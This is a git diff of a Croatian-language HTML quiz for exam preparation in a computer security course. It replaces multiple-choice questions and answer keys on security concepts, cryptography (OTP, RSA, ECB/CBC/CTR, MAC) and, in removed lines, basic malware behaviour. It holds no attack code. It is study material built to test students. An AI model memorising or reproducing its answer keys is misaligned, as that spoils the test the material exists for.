@@ -143,7 +143,7 @@
     <div style="padding: 8px 0 24px;">
       <div class="eyebrow">Sigurnost računalnih sustava</div>
       <h1>Provjeri <em>znanje</em> prije ispita.</h1>
-      <p class="lede">127 pitanja iz najvažnijih ispitnih tema: kriptografija, zloćudni kod, buffer overflow, web sigurnost, PKI, autentifikacija i sigurno programiranje.</p>
+      <p class="lede">110 pitanja pokrivaju međuispit (teme 1–5): kriptografija, sigurnost programske podrške, buffer overflow, OS sigurnost i web aplikacije.</p>
     </div>
     <div class="options-box">
       <h2>Postavke</h2>
@@ -153,7 +153,7 @@
           <button class="chip" data-count="10">10</button>
           <button class="chip" data-count="25">25</button>
           <button class="chip" data-count="50">50</button>
-          <button class="chip active" data-count="127">Sva (127)</button>
+          <button class="chip active" data-count="110">Sva (110)</button>
         </div>
       </div>
       <div class="option-row">
@@ -213,434 +213,548 @@
 
 <script>
 const ALL_QUESTIONS = [
-  // ── OSNOVE ──────────────────────────────────────────────────────────────────
+
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 1 — UVOD I OSNOVNI POJMOVI
+  // ══════════════════════════════════════════════════════════════
   {
-    topic: "Osnove sigurnosti",
-    q: "Ako nije ispunjen sigurnosni zahtjev, kažemo da se dogodio...",
-    answers: ["Napad", "Incident", "Ranjivost", "Prijetnja"],
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Što se dogodi kada neki od sigurnosnih zahtjeva više nije ispunjen?",
+    answers: ["Nastaje ranjivost", "Dogodi se incident i narušena je sigurnost", "Nastaje prijetnja", "Sustav se automatski gasi"],
     correct: 1,
-    explanation: "Incident je situacija u kojoj neki sigurnosni zahtjev više nije ispunjen. Ranjivost je pogreška koja omogućuje napad, a prijetnja je scenarij koji bi mogao nastupiti."
+    explanation: "Incident = situacija u kojoj sigurnosni zahtjev više nije ispunjen. Sama ranjivost bez prijetnje ne uzrokuje incident — incident zahtijeva i ranjivost i prijetnju."
   },
   {
-    topic: "Osnove sigurnosti",
+    topic: "Uvod — Osnove sigurnosti",
     q: "Koji su tri temeljna sigurnosna zahtjeva prema CIA trokutom?",
     answers: [
       "Povjerljivost, integritet, autentičnost",
       "Povjerljivost, integritet, raspoloživost",
-      "Autentičnost, neporecivost, raspoloživost",
-      "Tajnost, cjelovitost, neporecivost"
+      "Tajnost, neporecivost, raspoloživost",
+      "Autentičnost, integritet, neporecivost"
     ],
     correct: 1,
-    explanation: "CIA = Confidentiality (povjerljivost/tajnost), Integrity (cjelovitost/integritet), Availability (raspoloživost). Autentičnost i neporecivost su dodatna sigurnosna svojstva."
+    explanation: "CIA = Confidentiality (povjerljivost/tajnost), Integrity (integritet/cjelovitost), Availability (raspoloživost). Autentičnost i neporecivost su dodatna sigurnosna svojstva, ne dio temeljnog CIA trokuta."
   },
   {
-    topic: "Osnove sigurnosti",
-    q: "Koji sigurnosni zahtjev kaže da podatci trebaju biti nepromjenjivi?",
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Koji sigurnosni zahtjev govori da podaci trebaju biti nepromjenjivi — da stignu u istom obliku u kojima su poslani?",
     answers: ["Povjerljivost", "Raspoloživost", "Integritet", "Autentičnost"],
     correct: 2,
-    explanation: "Integritet znači da podaci stižu u istom obliku u kojemu su poslani — nitko ih nije mijenjao u prijenosu."
+    explanation: "Integritet: podaci stižu u istom obliku u kojemu su poslani. Narušen je ako netko može neovlašteno mijenjati podatke, čak i ako ne zna što oni znače."
   },
   {
-    topic: "Osnove sigurnosti",
-    q: "Buffer overflow je ranjivost u sustavu. Koje su dvije komponente nužne da bi nastao sigurnosni incident?",
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Buffer overflow bug postoji u alatu passwd. Koje su dvije nužne komponente da bi nastao sigurnosni incident?",
     answers: [
-      "Ranjivost i napadač",
+      "Napadač i korisnik sustava",
       "Ranjivost i prijetnja",
-      "Prijetnja i agent prijetnje",
-      "Incident i exploit"
+      "Exploit i antivirusni softver",
+      "Agent prijetnje i CVE identifikator"
     ],
     correct: 1,
-    explanation: "Za nastanak incidenta moraju postojati ranjivost (pogreška u dizajnu) i prijetnja (scenarij koji ju iskorištava). Sama ranjivost bez prijetnje ne uzrokuje incident."
+    explanation: "Incident nastaje kada postoje: (1) ranjivost — pogreška u dizajnu (buffer overflow), i (2) prijetnja — scenarij koji je iskorištava. Sama ranjivost bez prijetnje ne uzrokuje incident."
   },
   {
-    topic: "Osnove sigurnosti",
-    q: "Napadač prati potrošnju električne energije procesora kako bi otkrio tajni ključ. O kakvom kanalu se radi?",
-    answers: ["Prikriveni kanal (covert channel)", "Sporedni kanal (side channel)", "Stražnja vrata (backdoor)", "Komunikacijski kanal"],
-    correct: 1,
-    explanation: "Sporedni kanal (side channel) prenosi informacije koje ne možemo izbjeći — poput potrošnje struje, vremena izvođenja ili elektromagnetskog zračenja."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Koji izvor prijetnje ima praktički neograničene resurse i cilja prema državnim interesima?",
-    answers: ["Kibernetički kriminalci", "Haktivisti", "Napredne ustrajne prijetnje (APT)", "Automatizirane probe"],
-    correct: 2,
-    explanation: "APT grupe su dijelovi obavještajnih službi ili vojnih organizacija s neograničenim resursima. Kibernetički kriminalci su motivirani financijskom zaradom, haktivisti promicanjem stavova."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Što od sljedećeg NIJE korak u Cyber Kill Chain modelu?",
-    answers: ["Istraživanje (reconnaissance)", "Naoružavanje (weaponization)", "Eksfiltracija", "Instalacija"],
-    correct: 2,
-    explanation: "7 koraka Kill Chaina: istraživanje, naoružavanje, isporuka, iskorištavanje, instalacija, uspostava C2 kanala, djelovanje. Eksfiltracija nije zaseban korak modela."
-  },
-  {
-    topic: "Osnove sigurnosti",
-    q: "Koja je razlika između security i safety?",
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Napadač promatra razliku u potrošnji električne energije procesora kako bi otkrio tajni ključ. Koji kanal je to?",
     answers: [
-      "Security se odnosi na fizičku zaštitu, safety na digitalnu",
-      "Security je sigurnost od namjernih napada, safety je svojstvo da sustav neće prouzročiti štetu",
-      "Nema razlike, to su sinonimi",
-      "Safety se odnosi na vatrozide, security na antivirusnu zaštitu"
+      "Prikriveni kanal (covert channel)",
+      "Sporedni kanal (side channel)",
+      "Stražnja vrata (backdoor)",
+      "Kanalni napad"
     ],
     correct: 1,
-    explanation: "Security = zaštita od namjernih napada i prijetnji. Safety = svojstvo sustava da neće prouzročiti nenamjernu štetu (npr. sigurnost automobila u sudaru)."
+    explanation: "Sporedni kanal (side channel) prenosi informacije koje ne možemo izbjeći — potrošnja struje, elektromagnetsko zračenje, vremenska mjerenja. Prikriveni kanal je namjerni skriveni komunikacijski kanal (npr. duljina ICMP paketa)."
   },
   {
-    topic: "Osnove sigurnosti",
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Koja je razlika između pojmova security i safety?",
+    answers: [
+      "To su sinonimi — oba se prevode kao 'sigurnost'",
+      "Security je zaštita od namjernih prijetnji i napada; safety je svojstvo sustava da neće prouzročiti nenamjernu štetu",
+      "Safety se odnosi na fizičku zaštitu, security na digitalnu",
+      "Security je širi pojam koji uključuje safety"
+    ],
+    correct: 1,
+    explanation: "Security = sigurnost od namjernih napada. Safety = svojstvo sustava da neće prouzročiti štetu (npr. sigurnost automobila u nesreći). U hrvatskom se oba prevode kao 'sigurnost' što uzrokuje zabunu."
+  },
+  {
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Vatrozid, kriptografija i sustav za detekciju napada — koja je to vrsta kontrola?",
+    answers: ["Fizičke kontrole", "Administrativne kontrole", "Tehničke kontrole", "Operativne kontrole"],
+    correct: 2,
+    explanation: "Tehničke kontrole = tehnička sredstva zaštite (kriptografija, vatrozid, IDS). Fizičke = kamere, zaštitari, blindirana vrata. Administrativne = propisi, politike, procedure."
+  },
+  {
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Napadač koristi ICMP Echo Request poruke čija DULJINA (ne sadržaj) kodira tajnu poruku. Kakav kanal je to?",
+    answers: [
+      "Sporedni kanal (side channel)",
+      "Prikriveni kanal (covert channel)",
+      "Stražnja vrata (backdoor)",
+      "VPN tunel"
+    ],
+    correct: 1,
+    explanation: "Prikriveni kanal (covert channel) je komunikacijski kanal kojim se prenose podaci a da toga nisu svjesni legitimni korisnici. Kodiranje poruke duljinom ICMP paketa klasičan je primjer iz predavanja."
+  },
+  {
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Koja je razlika između povjerenja (trust) i povjerljivosti (confidentiality)?",
+    answers: [
+      "To su sinonimi — oba znače tajnost podataka",
+      "Povjerenje je informirano oslanjanje na karakter nekoga; povjerljivost je sigurnosni zahtjev da podatke vide samo ovlašteni",
+      "Povjerljivost je jači oblik povjerenja",
+      "Povjerenje se odnosi na ljude, povjerljivost isključivo na sustave"
+    ],
+    correct: 1,
+    explanation: "Iz predavanja: povjerenje (trust) ≠ povjerljivost (confidentiality). Možemo nečemu vjerovati a da to nije povjerljivo. Povjerenje nestaje ako se naruši sigurnost na bilo koji način."
+  },
+  {
+    topic: "Uvod — Osnove sigurnosti",
+    q: "U kojoj fazi životnog ciklusa sustava se TREBA početi brinuti o sigurnosti?",
+    answers: [
+      "Implementacija — kad se piše kod",
+      "Testiranje — kad se sustav može isprobati",
+      "Definiranje zahtjeva / Dizajn — što ranije to bolje",
+      "Uvođenje u produkciju — kad je sustav živ"
+    ],
+    correct: 2,
+    explanation: "Sigurnost treba ugraditi od samog početka. Temeljni mehanizam je modeliranje prijetnji (threat modeling) u fazi dizajna. Što se later otkrije ranjivost, to je skuplje i teže popraviti."
+  },
+  {
+    topic: "Uvod — Osnove sigurnosti",
     q: "Mirko je phishing napadom ukrao vjerodajnice zaposlenika. Što je buffer-overflow bug u alatu passwd u tom scenariju?",
     answers: ["Prijetnja", "Ranjivost", "Agent prijetnje", "Izvor prijetnje"],
     correct: 1,
-    explanation: "Buffer-overflow bug je ranjivost — pogreška u dizajnu/implementaciji koja se može iskoristiti. Mirko je agent prijetnje, phishing je prijetnja/metoda napada."
+    explanation: "Buffer-overflow bug je ranjivost — pogreška u dizajnu/implementaciji koja se može iskoristiti. Mirko je agent prijetnje. Phishing je metoda/prijetnja. Studentska udruga je izvor prijetnje."
   },
   {
-    topic: "Osnove sigurnosti",
-    q: "Vatrozid, kriptografija i sustav za detekciju napada koje su to vrste kontrola?",
-    answers: ["Fizičke kontrole", "Administrativne kontrole", "Tehničke kontrole", "Operativne kontrole"],
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Koja tvrdnja o upravljanju rizicima je točna?",
+    answers: [
+      "Rizici se mogu mjeriti samo kvantitativno (brojevima)",
+      "Upravljanje rizicima je jednokratna aktivnost na početku projekta",
+      "Rizik uključuje prijetnju i ranjivost; može biti kvantitativni ili kvalitativni; upravljanje je kontinuiran proces",
+      "Rizik se odnosi samo na vanjske napadače, ne na unutarnje"
+    ],
     correct: 2,
-    explanation: "Tehničke kontrole su tehnička sredstva zaštite. Fizičke su kamere i zaštitari, administrativne su propisi i politike."
+    explanation: "Rizik = kombinacija prijetnje, ranjivosti, vjerojatnosti i štete. Može biti kvantitativni (1-5) ili kvalitativni (nizak/srednji/visok). Upravljanje rizicima je kontinuiran, ne jednokratan, proces."
+  },
+  {
+    topic: "Uvod — Osnove sigurnosti",
+    q: "Što su stražnja vrata (backdoor) u sustavu?",
+    answers: [
+      "Fizički pristup poslužitelju bez autentifikacije",
+      "Mehanizam koji omogućuje neovlašteni ulaz u sustav — može biti ugrađen namjerno ili slučajno",
+      "Backup kopija korisničkih lozinki",
+      "Sigurnosni mehanizam za administratorski pristup"
+    ],
+    correct: 1,
+    explanation: "Backdoor omogućuje neovlašteni ulaz u sustav. Mogu biti namjerni (regulatorne obveze) ili slučajni (zaboravljena testna funkcionalnost). Svaki sustav ih potencijalno može imati."
   },
 
-  // ── KRIPTOGRAFIJA ───────────────────────────────────────────────────────────
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 2 — OSNOVE KRIPTOGRAFIJE
+  // ══════════════════════════════════════════════════════════════
   {
     topic: "Kriptografija",
     q: "Što je Kerckhoffov princip?",
     answers: [
-      "Sigurnost ovisi o tajnosti algoritma",
-      "Kriptosustav mora biti siguran čak i kad su javno poznati svi detalji osim ključa",
-      "Ključ mora biti iste duljine kao poruka",
-      "Šifriranje uvijek mora koristiti asimetričan algoritam"
+      "Sigurnost kriptosustava ovisi o tajnosti algoritma",
+      "Kriptosustav mora biti siguran čak i kad su javno poznati svi detalji osim samih ključeva",
+      "Ključ mora biti jednako dugačak kao poruka",
+      "Svaki kriptosustav mora koristiti asimetričnu kriptografiju"
     ],
     correct: 1,
-    explanation: "Kerckhoffov princip: algoritam može biti javan, sigurnost ovisi samo o tajnosti ključa. Suprotnost je 'security through obscurity' što se smatra lošom praksom."
+    explanation: "Kerckhoffov princip: algoritam smije biti javno poznat — sigurnost ovisi samo o tajnosti ključa. Suprotno je 'security by obscurity' što se smatra lošom praksom i krši smjernicu sigurnog dizajna."
   },
   {
     topic: "Kriptografija",
-    q: "Jednokratna bilježnica (OTP) pruža savršenu povjerljivost. Koje od navedenih svojstava OTP NE pruža?",
-    answers: ["Savršenu povjerljivost", "Integritet poruke", "Tajnost sadržaja", "Zaštitu od prisluškivanja"],
+    q: "Jednokratna bilježnica (OTP) pruža savršenu povjerljivost. Koje od sljedećih svojstava OTP NE pruža?",
+    answers: ["Savršenu povjerljivost", "Integritet poruke", "Zaštitu sadržaja od presretanja", "Tajnost ključa"],
     correct: 1,
-    explanation: "OTP pruža savršenu povjerljivost, ali NE štiti integritet — napadač može modificirati šifrat bez otkrivanja. Za integritet treba dodati MAC."
+    explanation: "OTP pruža savršenu povjerljivost (nemoguće probiti bez ključa), ali NE štiti integritet — napadač može modificirati šifrat bez otkrivanja. Niti autentičnost niti neporecivost ne pruža."
   },
   {
     topic: "Kriptografija",
-    q: "Zašto je ključno da se OTP ključ koristi samo jednom?",
+    q: "Zašto je kritično da se OTP ključ koristi samo jednom?",
     answers: [
       "Jer su ključevi preskupi za ponovnu upotrebu",
-      "Jer XOR dva šifrata istim ključem otkriva XOR originalnih poruka",
-      "Jer se ključ automatski briše nakon prve upotrebe",
-      "Jer bi inače isti tekst uvijek imao isti šifrat"
+      "Jer XOR dvaju šifrata šifriranih istim ključem daje XOR originalnih poruka, otkrivajući informacije o poruci",
+      "Jer ključ se automatski briše u hardveru",
+      "Jer bi inače isti tekst uvijek dao isti šifrat"
     ],
     correct: 1,
-    explanation: "Ako koristimo isti ključ za c1=m1⊕k i c2=m2⊕k, tada c1⊕c2 = m1⊕m2, što otkriva informacije o poruci bez znanja ključa."
+    explanation: "Iz predavanja: c1⊕c2 = (m1⊕k)⊕(m2⊕k) = m1⊕m2. Poznavanjem jedne poruke odmah se otkriva druga. Zato je ključno da bilježnica bude jednokratna — the key reuse attack je klasičan primjer."
   },
   {
     topic: "Kriptografija",
-    q: "Na čemu je zasnovan algoritam RSA?",
+    q: "Na čemu je zasnovan RSA algoritam?",
     answers: [
       "Na teškoći računanja diskretnog logaritma",
-      "Na teškoći faktorizacije velikih prostih brojeva",
-      "Na teškoći rješavanja problema ruksaka",
-      "Na teškoći invertiranja hash funkcija"
+      "Na teškoći faktorizacije velikog broja N = p·q na dva prosta faktora",
+      "Na teškoći invertiranja hash funkcija",
+      "Na teškoći rješavanja problema ruksaka (knapsack)"
     ],
     correct: 1,
-    explanation: "RSA je zasnovan na teškoći faktorizacije velikog broja N = p·q na dva prosta faktora. Javni ključ sadrži N i e, privatni sadrži d."
+    explanation: "RSA: odaberu se dva velika prosta broja p i q, izračuna N = p·q. Javni ključ sadrži N i e, privatni d. Sigurnost leži u teškoći faktorizacije N — bez znanja p i q ne može se izračunati d."
   },
   {
     topic: "Kriptografija",
     q: "Koja je ispravna formula za RSA enkripciju poruke m javnim ključem (e, N)?",
-    answers: ["c = m^d mod N", "c = m^e mod N", "c = H(m)^e mod N", "c = m XOR e mod N"],
+    answers: ["c = m^d mod N", "c = m^e mod N", "c = H(m)^e mod N", "c = m XOR e"],
     correct: 1,
-    explanation: "RSA enkripcija: c = m^e mod N (javni ključ e). Dekripcija: m = c^d mod N (privatni ključ d)."
+    explanation: "RSA enkripcija: c = m^e mod N (koristi se javni ključ e). Dekripcija: m = c^d mod N (koristi se privatni ključ d). Javni eksponent e je tipično 65537."
   },
   {
     topic: "Kriptografija",
-    q: "Koja je ispravna formula za RSA digitalni potpis poruke m privatnim ključem (d, N) uz hash funkciju H?",
-    answers: ["s = H(m)^e mod N", "s = H(m)^d mod N", "s = m^d mod N", "s = m^e mod N"],
+    q: "Koja je ispravna formula za RSA digitalni potpis poruke m s privatnim ključem (d, N) i hash funkcijom H?",
+    answers: ["s = H(m)^e mod N", "s = H(m)^d mod N", "s = m^d mod N", "s = H(m) XOR d"],
     correct: 1,
-    explanation: "Digitalni potpis: s = H(m)^d mod N (potpisuje privatnim ključem d). Verifikacija: s^e mod N == H(m) (provjerava javnim ključem e)."
+    explanation: "Potpis: s = H(m)^d mod N (privatni ključ). Verifikacija: provjeri je li s^e mod N jednako H(m). Iz predavanja: potpisivanje = hashiranje + padding + potenciranje na d u Zn."
   },
   {
     topic: "Kriptografija",
-    q: "Zašto je ECB način šifriranja nesiguran?",
+    q: "Kako se verificira RSA digitalni potpis s?",
+    answers: [
+      "Privatnim ključem d dešifrira se s i dobije m",
+      "Izračuna se s^e mod N i usporedi s H(m) — ako je jednako, potpis je valjan",
+      "Hash s i usporedi s H(m)",
+      "Pošalje se CA na verifikaciju"
+    ],
+    correct: 1,
+    explanation: "Verifikacija: s^e mod N mora biti jednako H(m). Javni ključ e koristi se za verifikaciju (svako može verificirati). Samo vlasnik privatnog ključa d može stvoriti valjan potpis."
+  },
+  {
+    topic: "Kriptografija",
+    q: "Zašto je ECB (Electronic Codebook) način šifriranja nesiguran?",
     answers: [
       "Jer ne koristi inicijalizacijski vektor",
-      "Jer isti blok otvorenog teksta uvijek daje isti šifrat",
+      "Jer isti blok otvorenog teksta uvijek daje isti šifrat — napadač može prepoznati obrasce",
       "Jer je previše spor za praktičnu upotrebu",
-      "Jer ne podržava blokove veće od 64 bita"
+      "Jer ne podržava ključeve dulje od 128 bita"
     ],
     correct: 1,
-    explanation: "U ECB načinu svaki blok se šifrira neovisno s istim ključem, pa isti ulaz uvijek daje isti izlaz — napadač može prepoznati obrasce u šifriranoj poruci."
+    explanation: "ECB svaki blok šifrira neovisno s istim ključem → isti ulaz = isti izlaz. Napadač može prepoznati ponavljajuće obrasce u šifriranom tekstu. Klasičan primjer je šifrirana bitmap slika gdje su boje vidljive."
   },
   {
     topic: "Kriptografija",
-    q: "U CBC načinu šifriranja, svaki blok otvorenog teksta XOR-a se s čime prije šifriranja?",
+    q: "U CBC načinu šifriranja, što se XOR-a s prvim blokom otvorenog teksta prije šifriranja?",
     answers: [
-      "S prethodnim blokom otvorenog teksta",
-      "S inicijalizacijskim vektorom (samo prvi blok) ili prethodnim šifratom",
-      "S ključem",
-      "S hash vrijednošću cijele poruke"
+      "Ključ k",
+      "Prethodni blok otvorenog teksta",
+      "Inicijalizacijski vektor (IV)",
+      "Hash prethodnog bloka šifrata"
     ],
-    correct: 1,
-    explanation: "U CBC: prvi blok XOR-a s IV, a svaki sljedeći blok XOR-a s prethodnim šifratom. To osigurava da isti otvoreni tekst daje različite šifrate."
+    correct: 2,
+    explanation: "CBC: prvi blok XOR-a s IV, svaki sljedeći blok XOR-a s prethodnim šifratom. Ovime isti otvoreni tekst daje različite šifrate ovisno o poziciji i IV-u. IV se mora slati uz šifrat."
   },
   {
     topic: "Kriptografija",
-    q: "Koji od navedenih načina kombiniranja enkripcije i MAC-a se smatra jedino sigurnim?",
+    q: "U CTR (Counter) načinu, što se dogodi ako se isti inicijalizacijski vektor koristi dva puta s istim ključem?",
+    answers: [
+      "Dešifriranje postaje nemoguće",
+      "XOR dvaju šifrata daje XOR originalnih poruka — poznavanjem jedne poruke otkriva se druga",
+      "Ključ se automatski invalidira",
+      "Drugi šifrat postaje identičan prvome"
+    ],
+    correct: 1,
+    explanation: "CTR s istim IV i ključem daje isti keystream. Ako c1=m1⊕ks i c2=m2⊕ks, tada c1⊕c2=m1⊕m2. Ovo je isti problem kao i OTP keystream reuse — kritična ranjivost."
+  },
+  {
+    topic: "Kriptografija",
+    q: "Koji od načina kombiniranja enkripcije i MAC-a je jedini siguran?",
     answers: ["Encrypt-and-MAC", "MAC-then-Encrypt", "Encrypt-then-MAC", "Hash-then-Encrypt"],
     correct: 2,
-    explanation: "Encrypt-then-MAC: prvo se šifrira poruka, zatim se MAC računa nad šifratom. Jedini je siguran jer MAC verificira cjelovitost šifrata prije dekripcije."
+    explanation: "Encrypt-then-MAC: najprije se šifrira poruka, zatim se MAC računa nad šifratom. Jedini je siguran jer MAC verificira cjelovitost šifrata PRIJE dekripcije, sprečavajući padding oracle i slične napade."
   },
   {
     topic: "Kriptografija",
-    q: "AES-128 ima efektivnu veličinu ključa 128 bita. Koliko je puta teže probiti AES-256 grubom silom od AES-128?",
+    q: "AES-128 ima efektivnu veličinu ključa 128 bita. Koliko je puta teže probiti AES-256 grubom silom?",
     answers: ["2 puta", "128 puta", "256 puta", "2^128 puta"],
     correct: 3,
-    explanation: "2^256 / 2^128 = 2^128. Dakle, AES-256 je 2^128 puta teže probiti grubom silom od AES-128 — astronomski veća razlika."
+    explanation: "2^256 / 2^128 = 2^128. AES-256 je 2^128 puta teže probiti grubom silom od AES-128. Oba su i dalje praktično neprobojni — ovo je česta zamka na ispitu jer djeluje kao greška."
   },
   {
     topic: "Kriptografija",
     q: "Koja od navedenih tvrdnji o AES-128 je NETOČNA?",
     answers: [
-      "Pruža savršenu povjerljivost",
+      "Pruža savršenu povjerljivost (perfect secrecy)",
       "Zasnovan je na supstitucijsko-permutacijskim mrežama",
-      "Potrebni su nepraktično veliki resursi za napad grubom silom",
-      "Ima efektivnu veličinu ključa od oko 128 bita"
+      "Nepraktično veliki resursi su potrebni za napad grubom silom",
+      "Efektivna veličina ključa je ~128 bita"
     ],
     correct: 0,
-    explanation: "AES NE pruža savršenu povjerljivost — to pruža samo OTP. AES je praktična blok šifra; savršena povjerljivost zahtijeva ključ duljine poruke koji se koristi samo jednom."
+    explanation: "AES NE pruža savršenu povjerljivost — to pruža samo OTP (jednokratna bilježnica). AES je praktična blok šifra; savršena povjerljivost zahtijeva ključ duljine poruke koji se koristi samo jednom."
+  },
+  {
+    topic: "Kriptografija",
+    q: "AES-128 štiti integritet poruke. Je li ova tvrdnja točna?",
+    answers: ["Da, AES garantira i povjerljivost i integritet", "Ne, AES sama po sebi štiti samo povjerljivost — integritet zahtijeva dodatni MAC", "Da, jer promjena šifrata uvijek rezultira besmislenim otvorenim tekstom", "Ne, AES ne štiti ni povjerljivost ni integritet bez dodatnog protokola"],
+    correct: 1,
+    explanation: "AES (kao i svaka simetrična šifra bez MAC-a) ne štiti integritet. Napadač može modificirati šifrat a da primatelj to ne primijeti. Za integritet treba dodati MAC (npr. HMAC) — idealno Encrypt-then-MAC."
   },
   {
     topic: "Kriptografija",
     q: "Što je digitalna omotnica (digital envelope)?",
     answers: [
-      "Šifriranje poruke samo asimetričnim algoritmom",
-      "Poruka se šifrira simetričnim ključem k, a ključ k se šifrira asimetričnim (javnim) ključem primatelja",
-      "Digitalni potpis koji zamotava cijelu poruku",
+      "Poruka šifrirana samo asimetričnim algoritmom primatelja",
+      "Poruka se šifrira simetričnim ključem k, a k se šifrira javnim ključem primatelja — brzo + sigurno",
+      "Digitalni potpis koji 'zamotava' cijelu poruku",
       "Hash vrijednost poruke šifrirana privatnim ključem"
     ],
     correct: 1,
-    explanation: "Digitalna omotnica kombinira brzinu simetrične enkripcije s prednostima asimetrične. Poruka se šifrira simetričnim ključem k, a k se asimetrično šifrira javnim ključem primatelja."
+    explanation: "Digitalna omotnica kombinira brzinu simetrične enkripcije s prednostima asimetrične: poruka se šifrira simetričnim k (brzo), k se šifrira javnim ključem primatelja (siguran prijenos ključa)."
   },
   {
     topic: "Kriptografija",
     q: "Kriptografska hash funkcija smatra se sigurnom ako...",
     answers: [
-      "Vraća uvijek isti izlaz za isti ulaz",
+      "Uvijek vraća isti izlaz za isti ulaz",
       "Nije pronađena kolizija — dvije različite poruke koje daju isti sažetak",
-      "Može se invertirati uz znanje ključa",
+      "Može se invertirati uz znanje tajnog ključa",
       "Sažetak je iste duljine kao ulaz"
     ],
     correct: 1,
-    explanation: "Kriptografska hash funkcija mora biti otporna na kolizije. Kolizija mora matematički postojati jer je prostor ulaza veći od prostora izlaza, ali mora biti računski nemoguće je pronaći."
+    explanation: "Sigurna hash funkcija je otporna na kolizije. Matematički kolizija mora postojati (prostor ulaza >> prostor izlaza), ali mora biti računski nemoguće je pronaći. SHA-256 je trenutno siguran, MD5 i SHA-1 nisu."
+  },
+  {
+    topic: "Kriptografija",
+    q: "Što je MAC (Message Authentication Code) i čime se razlikuje od digitalnog potpisa?",
+    answers: [
+      "MAC je asimetrični potpis, digitalni potpis je simetrični",
+      "MAC koristi tajni dijeljeni ključ i ne pruža neporecivost; digitalni potpis koristi privatni ključ i pruža neporecivost",
+      "MAC i digitalni potpis su identični mehanizmi",
+      "MAC šifrira poruku, digitalni potpis je samo hash"
+    ],
+    correct: 1,
+    explanation: "MAC: tajni dijeljeni ključ znaju obje strane → ne pruža neporecivost (bilo koja strana mogla je kreirati MAC). Digitalni potpis: samo vlasnik privatnog ključa može ga stvoriti → pruža neporecivost."
+  },
+  {
+    topic: "Kriptografija",
+    q: "Zašto se RSA gotovo nikad ne koristi samostalno za šifriranje dugih poruka?",
+    answers: [
+      "Jer RSA ključevi nisu dovoljno dugački",
+      "Jer je asimetrična enkripcija puno sporija od simetrične, i jer obični RSA nije semantički siguran",
+      "Jer RSA ne podržava poruke dulje od 256 bajta",
+      "Jer RSA zahtijeva dijeljeni tajni ključ"
+    ],
+    correct: 1,
+    explanation: "Obični RSA (bez randomiziranog paddinga) je deterministički — isti plaintext = isti ciphertext. Napadač s kratkim porukom (npr. DA/NE) može pogoditi. Uz to, asimetrična enkripcija je daleko sporija."
+  },
+  {
+    topic: "Kriptografija",
+    q: "Digitalni potpis pruža neporecivost. Zašto?",
+    answers: [
+      "Jer koristi hash funkciju",
+      "Jer samo vlasnik privatnog ključa može ga stvoriti — svi mogu verificirati ali samo on može potpisati",
+      "Jer je šifriran javnim ključem primatelja",
+      "Jer koristi simetrični ključ koji dijele obje strane"
+    ],
+    correct: 1,
+    explanation: "Neporecivost: pošiljatelj ne može poreći da je potpisao poruku jer samo on posjeduje privatni ključ. Za razliku od MAC-a gdje obje strane znaju ključ pa svaka može kreirati MAC."
   },
 
-  // ── ZLOĆUDNI KOD ────────────────────────────────────────────────────────────
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 2 — PKI & CERTIFIKATI
+  // ══════════════════════════════════════════════════════════════
   {
-    topic: "Zloćudni kod",
-    q: "Koji zloćudni kod se SAMOSTALNO širi po mreži bez potrebe za vektorom?",
-    answers: ["Trojanac", "Virus", "Crv (worm)", "Downloader"],
-    correct: 2,
-    explanation: "Crv se samostalno širi po mreži — ne treba se 'zakačiti' za drugi program kao virus. Trojanac se pretvara da je koristan program, virus se ubacuje u legalne izvršne datoteke."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "GuLoader.exe preuzima s mreže kriptirane podatke i pokreće NetWire-RAT.exe. Spada li GuLoader u crve?",
+    topic: "PKI & Certifikati",
+    q: "Tko je potpisao Signature Value u TLS certifikatu čiji je Issuer 'GEANT OV RSA CA 4'?",
     answers: [
-      "Da, jer se širi s računala na računalo",
-      "Ne, jer ne može samostalno preuzeti sebe i kopirati se na druga računala",
-      "Da, jer koristi mrežu za širenje",
-      "Ne, jer nema zloćudnu funkcionalnost"
-    ],
-    correct: 1,
-    explanation: "GuLoader je downloader — preuzima i instalira drugi zloćudni kod. Crv se samostalno širi na nova računala, što GuLoader ne radi."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "Što je Command and Control (C&C) poslužitelj?",
-    answers: [
-      "Antivirusni poslužitelj koji kontrolira skeniranje",
-      "Udaljeni poslužitelj kojim napadač upravlja zaraženim računalima i prima ukradene podatke",
-      "Backup poslužitelj za kriptirane podatke",
-      "DNS poslužitelj koji preusmjerava promet"
-    ],
-    correct: 1,
-    explanation: "C&C poslužitelj napadaču omogućava upravljanje botovima, slanje naredbi i primanje eksfiltriranih podataka — sve bez fizičkog pristupa žrtvinim računalima."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "Na zaraženom računalu u datoteci hosts nalaze se zapisi '0.0.0.0 symantec.com' i '0.0.0.0 mcafee.com'. Zašto?",
-    answers: [
-      "Kako bi preusmjerio promet na antivirusne stranice",
-      "Kako bi spriječio ažuriranja antivirusnog softvera",
-      "Kako bi omogućio udaljeni pristup sustavu",
-      "Kako bi poboljšao performanse DNS rezolucije"
-    ],
-    correct: 1,
-    explanation: "Mapiranjem antivirusnih domena na 0.0.0.0 (nepostojeća adresa), malware sprečava računalo da kontaktira antivirusne servere i dobije ažurirane potpise koji bi ga otkrili."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "Koji zloćudni kod se pretvarano da obavlja korisnu funkciju, a sadrži maliciozni teret?",
-    answers: ["Virus", "Crv", "Trojanac", "Ransomware"],
-    correct: 2,
-    explanation: "Trojanac (trojanski konj) se prikazuje kao koristan program ali sadrži skrivenu malicioznu funkcionalnost. Ime dolazi iz grčke mitologije — drveni konj koji je skrivao vojnike."
-  },
-  {
-    topic: "Zloćudni kod",
